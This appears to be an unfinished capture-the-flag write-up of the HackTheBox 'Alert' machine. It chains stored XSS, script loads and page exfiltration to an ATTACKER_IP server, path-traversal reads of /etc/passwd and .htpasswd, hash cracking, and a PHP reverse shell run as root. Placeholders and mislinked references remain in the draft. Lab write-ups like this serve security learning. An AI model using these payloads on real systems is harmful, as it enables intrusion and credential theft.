## Introduction
This is an easy machine on
[HackTheBox](){:target="_blank"}{:rel="noopener noreferrer"}.

> This is what a hint will look like!
{: .prompt-tip }

## Enumeration
You can't break into a house if you don't know where it is.
During this stage we want to learn everything we can about
the server.

### Port Scan
Let's start with a port scan to find available services

```bash
rustscan -a MACHINE_IP -- -A -oA scan -sC
```

![rustscan1](/images/htb-alert/rustscan1.png)

![rustscan2](/images/htb-alert/rustscan2.png)

We have two open ports
- 22: SSH
- 80: HTTP

### Website
There's a website being served on port 80 so let's
try to view it. If we visit the machine IP directly we'll
be redirected to the domain `alert.htb`. This domain doesn't
exist on the internet but we can simulate a DNS lookup by
adding the IP mapping directly in our
`/etc/hosts` file (only `root` can write to this file)

```
MACHINE_IP alert.htb
```

Now the site is accessible by visiting `http://alert.htb`

#### MD Viewer

Visiting the homepage, it becomes clear that the site's main feature 
is to render markdown or `md` files

![homepage](/images/htb-alert/homepage.png)

[Markdown](https://www.markdownguide.org/basic-syntax/){:target="_blank"}{:rel="noopener noreferrer"}
is a language which is used to format text files (great for blogs). It's essentially
a more readable version of `HTML`. Many markdown applications actually
support `HTML` tags directly!

Let's see what features this renderer supports by creating our
own `md` file

```md
# Header made with Markdown

Some regular text for comparison

<h1> Header made with HTML </h1>
```

![md-test](/images/htb-alert/md-test.png)

Another thing to notice is the `Share Markdown` link which
will let us view any previously rendered file.

> What tags can we add to the `md` file to run code?
{: .prompt-tip }

#### About Page
Our goal is to gather information so we should visit
every page we can! Sometimes we can find potential 
usernames/credentials in the about page 

![about-page](/images/htb-alert/about-page.png)

Apparently an admin reviews every contact message.
Let's look into this further

#### Contact Page
What does it mean to review a message? We can't send
them any files, but maybe they'll click on a provided
link.

To test this out, start a web server on your machine
machine

```bash
python3 -m http.server 80
```

Now include a link to your server in the contact page
and send it

![contact-test](/images/htb-alert/contact-test.png)

Checking our web server logs we see a hit from the
machine ip!

![contact-response](/images/htb-alert/contact-response.png)

### Directory Search
There are a lot of links we can find organically by
manually interacting with the site. However, there
may be some hidden files or directories that aren't
so easy to access.

The most straight forward way to uncover these files
is through good ol fashioned brute forcing. When we
request a resource that doesn't exist, the server will
typically respond with a 404 response. But if we hit
something that does exist, we'll get something else!

We can find hidden files and directories using `dirsearch`

```bash
dirsearch -w /usr/share/wordlists/dirb/big.txt -r -f --url=alert.htb --output=dirsearch-ext.txt -e txt,php,html,js,md
```

![dirsearch](/images/htb-alert/dirsearch.png)

We've seen most of these pages but the `/messages` directory
and the `messages.php` file are new

![forbidden-dir](/images/htb-alert/forbidden-dir.png)

We can't seem to access it without special privileges, but it's
good to know it exists

### Subdomains
One server can host multiple different websites. To
differentiate between them, each site has its own
domain name. If you want to host a unique section
with the same domain name, you can use a subdomain.

Using `wfuzz` to bruteforce, we can run the following
command

```bash
wfuzz -c --hc 302 -t 50 -u http://alert.htb -H 'Host: FUZZ.alert.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

There are a lot of duplicate responses so we need to
add a filter. By reading the help menu using
`wfuzz --help`, we can hide responses that have
the the same number of words with the `--hw` flag.
Our new command becomes

```bash
wfuzz -c --hc 302 -t 50 -u http://alert.htb -H 'Host: FUZZ.alert.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hw 28
```

![subdomain](/images/htb-alert/subdomain.png)

A new subdomain! Just like the original domain name, we'll
need to add this to our `/etc/hosts` file. Our new entry
should look like this

```
MACHINE_IP alert.htb statistics.alert.htb
```

Now we can visit it at `http://statistics.alert.htb`

![statistics-homepage](/images/htb-alert/statistics-homepage.png)

It's asking us for credentials! We can't access this
just yet, but keep it in mind for later.

## Initial Foothold
At this point we've collected all the necessary pieces.
We just need to find a few exploits and craft
an exploit chain which gives us access to the server!

### XSS
> What part of the site will interpret tags we include?
{: .prompt-tip }

I'm not convinced the markdown renderer properly santizes
user input. Let's test this out by trying to include
the HTML `<script>` tag in our md file.

Upload this to the renderer
```md
<script>alert('JS CODE EXECUTION');</script>
```

![XSS-test](/images/htb-alert/XSS-test.png)

Now we can run arbitrary JavaScript, otherwise known as
an XSS vulnerability (Cross Site Scripting)!

### Privileged XSS
> How can we make an admin run our payload?
{: .prompt-tip }

There are two pieces we need to connect to progress.
We know an admin will visit any link that we send
through the `Contact Us` page. We can also create a page
which runs JavaScript. By sending the admin our malicious
page, we should be able to run code as a privileged user.

To confirm this, we can upload another `md` file which
will request a file from our web server. 
```javascript
<script src="http://ATTACKER_IP/admin-xss-test"></script>
```

Now we can share the link with the admin by sending it 
through the Contact Page

![admin-xss-setup](/images/htb-alert/admin-xss-setup.png)

Checking our web server logs we see the
following

![admin-xss-confirmed](/images/htb-alert/admin-xss-confirmed.png)

The first two entries are from rendering the file and generating
the link, which is why the IP listed is different. The highlighted
entry confirms that the admin user will run any scripts we give them!

Instead of editing our `md` file directly every time,
create a file called `payload.js`
and place it in our `python` web server directory.
Our payoad file becomes

```md
<script src="http://ATTACKER_IP/payload.js"></script>
```

Now we can modify our payload without having to upload
the `md` file multiple times! We only need to resend
the link to trigger our new payload

### Local File Read
> What resources are only accessible to privileged users?
{: .prompt-tip }


Going back to our directory bruteforce, there were some
directories and files that we didn't have access to as
a normal user. These were `/messages` and `/messages.php`.

Since we can run JS as a privileged user, we
need to find a way to return the page content of these
restricted files. Luckily, we can use this
[template](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/steal-info-js){:target="_blank"}{:rel="noopener noreferrer"}
provided by hacktricks!

Essentially, this script will encode page content
into base64 and send it to a server we control.
We do need to make a few minor modifications to make it
work properly. Change the following variables at the top

```javascript
var ATTACKER_SERVER = "http://ATTACKER_IP"
var EXFIL_BY_FETCH_GET = true
```

Let's try to see the contents of `messages.php` by adding
the following to our payload script

```javascript
exfil_page_content("messages.php");
```

When the payload is run, we see this in our logs

// alert-messages-b64

The content of the page can be decoded from base64 using
[cyberchef](https://cyberchef.org/){:target="_blank"}{:rel="noopener noreferrer"}
and we receive the following

// alert-messages-content
```html
<h1>Messages</h1><ul><li><a href='messages.php?file=2024-03-10_15-48-34.txt'>2024-03-10_15-48-34.txt</a></li></ul>
```

The important bit is the `file` HTTP parameter. It points
to a `txt` file, but what if we try to access a different
file on the system?

Change the page we want to exfiltrate to `/etc/passwd`

```
exfil_page_content("messages.php?file=../../../../../../../etc/passwd");
```

Decoding the response we get

// etc-passwd-leak

Now we have a way to read local files on the server!

### Credentials
> What part of the website needs credentials? Where are
> those credentials stored?
{: .prompt-tip }

Remember that pesky subdomain that required HTTP authentication
to access? HTTP authentication uses credentials specified in
`.htpasswd` files. That's all well and good, but we don't
know where these files are stored. Typically they're found
in the `/var/www/WEBSITE-NAME/.htpasswd` directory, but
we aren't certain what they named statistics folder.
Brute forcing with some educated guesses could work, but
there's an easier way!

We know from our initial port scan that the HTTP server
is running Apache. Reading some
[public documentation](https://cyberchef.org/){:target="_blank"}{:rel="noopener noreferrer"}
, we know that the apache configuration file is located
in `/etc/apache2/sites-available/000-default.conf`. So
let's read the content of that file

Add the following to our payload
```javascript
exfil_page_content("messages.php?file=../../../../../../../../etc/apache2/sites-available/000-default.conf");
```

Decoding the response we see this
```
    <Directory /var/www/statistics.alert.htb>
        Options Indexes FollowSymLinks MultiViews
        AllowOverride All
        AuthType Basic
        AuthName "Restricted Area"
        AuthUserFile /var/www/statistics.alert.htb/.htpasswd
        Require valid-user
    </Directory>
```

The `AuthUserFile` option contains the `.htpasswd` file path! 
One more request to read the credentials
```javascript
exfil_page_content("messages.php?file=../../../../../../../../var/www/statistic.alert.htb/.htpasswd");
```

We get the following username and hash
// htpasswd-hash

To quickly crack the hash, I'm going to use john the ripper.
The program will try to automatically detect the hash type, then
will run a dictionary attack using the famous `rockyou.txt`
wordlist.

> While john will attempt to detect the hash, sometimes there are
> multiple matching cases! Make sure to read the output and change
> the command accordingling
{: .prompt-info }

In our case, we need to add the `-format=md5crypt-long` flag. Our
final command becomes
```
JOHN COMMAND HERE
```

// john-creds

With these credentials we can access the protected subdomain

// statistics-homepage

### User Flag
> Where could credentials be reused? What service gives us access to
> the server?
{: .prompt-tip }

Admittedly, the statstics subdomain isn't very useful on its own. However,
having credentials is extremely valuable! People are often lazy when it
comes to creating new and unique passwords for every service, so
they'll reuse credentials. The only service we haven't
touched is `SSH` on port 22. Time to login

```bash
ssh albert@VICTIM_IP
```

We're in!!! Now we can read the user flag

// user-flag

## Privilege Escalation
We're on the server but our privileges are still limited. We can
modify the website but don't have complete access to the entire
system. `root` here we come

### User Privileges
Whenever we gain access to a new user/account, it's a good idea to
enumerate available privileges. Sometimes they have
`root` accesss right off the bat through the `sudo` command. We
aren't so lucky, but we also aren't so desperate.
Using the `groups` command we see that our user is part of 
the `management` group

// albert-groups

It's not clear how we can leverage this now, but let's keep digging.

### Hidden Processes
> Have you heard of 
> [pspy](https://cyberchef.org/){:target="_blank"}{:rel="noopener noreferrer"}?
{: .prompt-tip }

Even though we are a normal user, we can see what the higher privileged
users are running. If we can hijack one of these processes,
we can grow our power!

In comes [pspy](https://cyberchef.org/){:target="_blank"}{:rel="noopener noreferrer"}!
A convenient program whichs show us what processes are being
run and the privileges they have. We just need to upload and run it.

There are many ways to upload files but I prefer hosting
a web server. On the attacker machine, download the
[pspy](https://cyberchef.org/){:target="_blank"}{:rel="noopener noreferrer"}
files and move to that directory. Start a server with the command

```bash
python3 -m http.server 80
```

We can retrieve the files on the victim machine

```bash
cd /tmp
wget http://ATTACKER_IP/pspy64
```

Make the file executable and run it

```bash
chmod +x pspy64
./pspy64
```

// pspy

The `/opt/SOMETHING/configuration.php` file is run as `root`. 
Let's investigate it a little further.

### root
> How can we modify the suspicious file?
{: .prompt-tip }

Checking the file permissions

```bash
ls -la
```

// config-perms

Looks like users in our group can modify it! Any `php` written
here file is run as `root`. Sounds like the perfect situation 
for a reverse shell!

When use a service like `SSH`, the client (us)
sends a connection request to the server and they respond with
a shell. However, what if we want to reverse that process? 
Make the server send a connection request to us! If we
accept, the server will forward any commands we send it.

On our machine setup a listener to accept the incoming
server request
```bash
nc -lvnp 4444
```

Generate a reverse shell payload using this
[revshell generator](){:target="_blank"}{:rel="noopener noreferrer"}.
Change the IP to your machine's IP and the PORT to 4444. I'm going
to use the LOOKUP WHAT IT'S CALLED payload. It should look like this

```
REVSHELL PAYLOAD HERE
```

This payload will work when run in a terminal, but we're
executing `php`! How can we remedy this? Looking
at some 
[documentation](https://cyberchef.org/){:target="_blank"}{:rel="noopener noreferrer"},
we can pass our payload to the `system` function!

Write the following to the configuration file and wait a few seconds
```
system("REVSHELL-HERE");
```

// root-shell

We have a shell as root! There are ways to stabilize this shell and
solidify our foothold, but this is enough to read the root flag

// root-flag

## Conclusion
The website's main feature is rendering an MD file uploaded by the user.
By adding the script tag, we can run unauthorized JavaScript, demonstrating
an XSS vulnerability. The About Page hints that an admin
will visit links sent through the Contact Page. 
Leveraging this, the admin user will run any JavaScript we write. 

Further enumeration reveals the `messages.php` file and a subdomain
protected with credentials. Visiting `messages.php`
as an admin exposes an arbitrary file read. Abusing this, the
subdomain credentials can be leaked and cracked. 
Trying to `SSH` with these credentials gives a foothold into the system.

Enumerating user privileges, we see they are part of the `management` group.
Running `pspy` in the background, shows root running the `configuration.php`
file on a loop. The `management` group can modify this file, giving code
exeuction as `root`. Adding a reverse shell gives us `root` and `root.txt`!
